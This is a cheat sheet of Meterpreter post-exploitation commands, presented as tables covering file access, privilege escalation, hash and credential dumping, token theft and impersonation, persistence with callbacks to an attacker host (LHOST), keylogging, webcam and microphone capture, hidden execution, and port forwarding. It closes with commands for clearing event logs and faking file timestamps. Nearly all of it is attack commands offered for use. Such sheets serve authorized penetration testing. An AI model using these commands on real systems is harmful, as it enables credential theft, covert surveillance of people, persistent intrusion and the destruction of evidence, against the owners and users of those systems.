# Meterpreter Cheat Sheet

## File System
| Command | Description |
|---------|-------------|
| `pwd` | Print working directory |
| `cd dir` | Change directory |
| `ls` | List files |
| `search -f *.txt` | Search files |
| `search -f *.config -r /` | Recursive search |
| `cat file` | Display file content |
| `edit file` | Edit file with vi |
| `upload /local/path /remote/path` | Upload file |
| `download /remote/file /local/path` | Download file |
| `mkdir dir` | Create directory |
| `rmdir dir` | Remove directory |
| `rm file` | Delete file |
| `mv src dst` | Move/rename |
| `getlwd` | Local working directory |
| `lcd dir` | Change local dir |

## System Information
| Command | Description |
|---------|-------------|
| `sysinfo` | System details |
| `getuid` | Current user |
| `getsystem` | Attempt privilege escalation |
| `getprivs` | Current privileges |
| `getpid` | Process ID |
| `get_client` | Client info |
| `platform` | OS platform |
| `arch` | System architecture |
| `machine_id` | Machine identifier |
| `uuid` | Meterpreter session UUID |

## Process Management
| Command | Description |
|---------|-------------|
| `ps` | List processes |
| `ps -A` | All processes |
| `pgrep notepad` | Search process by name |
| `kill PID` | Terminate process |
| `migrate PID` | Migrate to process |
| `steal_token PID` | Steal process token |
| `drop_token` | Drop stolen token |
| `suspend/resume PID` | Suspend/resume process |

## Privilege Escalation
| Command | Description |
|---------|-------------|
| `getsystem -t 0` | All techniques |
| `getsystem -t 1` | Service pipe |
| `getsystem -t 2` | Named pipe |
| `getsystem -t 3` | Token duplication |
| `getsystem -t 4` | Named pipe (RPCSS) |
| `use exploit/windows/local/bypassuac` | Bypass UAC (in msf) |
| `use exploit/windows/local/ms16_032` | MS16-032 |

## Hash Dumping
| Command | Description |
|---------|-------------|
| `hashdump` | Dump SAM hashes |
| `run post/windows/gather/smart_hashdump` | Smart hashdump |
| `run post/linux/gather/hashdump` | Linux hashes |
| `run post/windows/gather/cachedump` | Domain cache |
| `run post/windows/gather/credentials/credential_collector` | Collect creds |

## Token Management
| Command | Description |
|---------|-------------|
| `list_tokens -u` | User tokens |
| `list_tokens -g` | Group tokens |
| `impersonate_token DOMAIN\\User` | Impersonate user |
| `rev2self` | Revert to original |

## Persistence
| Command | Description |
|---------|-------------|
| `run persistence -X -i 30 -p 4444 -r LHOST` | Startup persistence |
| `run persistence -S -i 30 -p 4444 -r LHOST` | Service persistence |
| `run persistence -U -i 30 -p 4444 -r LHOST` | User logon |
| `run persistence -X -i 30 -p 4444 -r LHOST -A` | Auto-start |
| `run scheduleme -m 5 -c "shell"` | Schedule task |
| `use exploit/windows/local/persistence_service` | Service persistence (msf) |
| `metsvc -r` | Remove meterpreter service |

## Network Commands
| Command | Description |
|---------|-------------|
| `ipconfig` | Network interfaces |
| `route` | Routing table |
| `arp` | ARP cache |
| `netstat -ano` | Active connections |
| `netstat -an` | Connections without names |
| `portfwd add -l 1234 -p 3389 -r target` | Port forward |
| `portfwd delete -l 1234` | Remove forward |
| `portfwd list` | List forwards |

## Screenshot & Keylogging
| Command | Description |
|---------|-------------|
| `screenshot` | Capture screen |
| `screengrab` | Alternative screenshot |
| `keyscan_start` | Start keylogger |
| `keyscan_dump` | Dump captured keys |
| `keyscan_stop` | Stop keylogger |
| `webcam_list` | List cameras |
| `webcam_snap` | Capture from camera |
| `webcam_stream` | Stream from camera |
| `record_mic -d 10` | Record microphone (sec) |

## Shell & Execution
| Command | Description |
|---------|-------------|
| `shell` | Drop to system shell |
| `execute -f cmd.exe -i -H` | Execute hidden, interactive |
| `execute -f cmd.exe -c -H` | Execute channeled |
| `execute -f notepad.exe -d` | Execute in background |
| `execute -f powershell.ps1 -c` | Execute PS script |
| `powershell_execute "cmd"` | Execute PS command |
| `irb` | Ruby shell |
| `python_execute "print('hi')"` | Python shell |

## Loot & Data Collection
| Command | Description |
|---------|-------------|
| `run post/windows/gather/enum_applications` | Installed apps |
| `run post/windows/gather/enum_services` | Services |
| `run post/windows/gather/enum_patches` | Patches |
| `run post/windows/gather/enum_shares` | Shares |
| `run post/windows/gather/dumplinks` | Recent files |
| `run post/windows/gather/checkvm` | Check VM |
| `run post/multi/recon/local_exploit_suggester` | Suggest exploits |

## Clear Traces
| Command | Description |
|---------|-------------|
| `clearev` | Clear event logs |
| `timestomp file -c "1/1/2020"` | Change file timestamps |
